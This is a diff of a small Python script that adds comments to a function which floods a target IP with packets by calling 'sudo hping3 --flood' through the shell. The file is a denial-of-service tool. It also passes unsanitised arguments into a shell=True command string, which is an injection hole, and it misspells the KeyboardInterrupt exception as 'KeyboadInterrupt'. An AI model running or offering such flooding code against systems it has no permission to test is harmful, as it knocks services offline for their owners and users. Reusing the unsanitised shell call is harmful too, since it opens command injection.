@@ -1,9 +1,14 @@
 import subprocess
 
+# Function for flooding packets
 def flood_pkt(target_ip, pktnum, pktsize):
+
+    # Start flooding with given parameters in the function
     try:
         print("\n\033[36m Begin Packet Flooding...")
         res = subprocess.run(f"sudo hping3 -c {pktnum} -d {pktsize} --flood {target_ip}", shell=True, text=True)
+    
+    # Handling keyboard interrupt like Ctrl + C/Z
     except KeyboadInterrupt: 
         print("\n\033[31m Process stopped by the user before completion !!!")
     finally:
